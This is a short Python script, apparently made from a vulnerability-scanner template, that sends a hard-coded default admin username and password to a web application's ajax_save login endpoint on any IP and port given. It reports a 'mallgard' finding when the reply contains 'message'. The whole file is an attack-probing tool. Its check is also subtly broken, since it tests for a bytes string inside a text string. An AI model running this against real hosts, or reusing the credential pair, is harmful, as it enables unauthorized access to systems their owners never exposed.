#encoding:utf-8
try:
    import requests,os,sys,logging
    logging.basicConfig(level=logging.INFO,format="%(message)s")
    requests.packages.urllib3.disable_warnings()
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

def check(ip,port):
    target = "https://" + ip + ":" + port
    payload = "/index.php?c=user&a=ajax_save"                                #填写payload
    header = {"Content-type": "text/html; charset=utf-8"}                                 #填写header头
    data = "username=admin&password=hicomadmin&language=zh-cn"                                   #填写data数据
    try:
        ssl = requests.session()
        req = ssl.post(url=target+payload,headers=header,data=data,timeout=3,verify=False)

        if req.status_code == 200:
            if (b'message' in req.text) :              #填写判断条件
                logging.info("[+] {} find mallgard".format(ip))                          #填写漏洞名
                os._exit(1)

        logging.info("[-] {} do not found mallgard".format(ip))                          #填写漏洞名
        os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)